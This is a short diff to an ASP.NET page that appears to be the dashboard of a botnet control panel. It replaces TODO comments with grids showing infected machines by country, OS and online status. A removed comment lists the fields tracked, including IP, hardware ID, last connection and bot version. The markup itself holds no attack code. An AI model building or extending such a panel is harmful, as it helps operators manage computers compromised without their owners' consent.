@@ -231,7 +231,10 @@
                     </ul>
                 </div>
                 <div class="CountryCountGraph">
-                    <% //TODO: Country With Amounts %>
+                    <div class="Grid">
+                        <asp:GridView ID="grdCountry" runat="server" onrowdatabound="grdCountry_RowDataBound">
+                        </asp:GridView>
+                    </div>
                 </div>
             </div>
 
@@ -242,7 +245,10 @@
                     </ul>
                 </div>
                 <div class="OSCountGraph">
-                    <% //TODO: OS's With Amounts %>
+                    <div class="Grid">
+                        <asp:GridView cssClass="grdOS" ID="grdOS" runat="server" onrowdatabound="grdOS_RowDataBound">
+                        </asp:GridView>
+                    </div>
                 </div>
             </div>
         </div>
@@ -255,9 +261,10 @@
                     </ul>
                 </div>
                 <div class="OnlineNowGraph">
-                    <% //TODO: GridVieuw with ID/PCNAME/IP/CPU/GPU/INSTALDATE/LASTCON/OS/COUNTRY/REGION/HARDWAREID/VERSIONOFBOT %>
-                    <asp:GridView ID="GridView1" runat="server" Height="164px" Width="1118px">
-                    </asp:GridView>
+                    <div class="Grid">
+                        <asp:GridView ID="grdOnline" runat="server" onrowdatabound="grdOnline_RowDataBound">
+                        </asp:GridView>
+                    </div>
                 </div>
             </div>
         </div>
